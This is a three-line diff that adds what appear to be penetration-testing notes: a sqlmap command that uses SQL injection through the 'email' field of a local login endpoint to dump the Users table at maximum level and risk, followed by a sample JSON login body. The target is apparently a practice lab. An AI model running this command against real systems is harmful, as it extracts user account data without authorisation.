@@ -1,0 +1,3 @@
+http://192.168.109.1:3000/rest/user/login (POST)  # /usr/bin/sqlmap -r ./Documents/log.txt --tables Users --dump -p email --level 5 --risk 3 --ignore-code 401
+
+{"email":"asdasda","password":"asdads"}
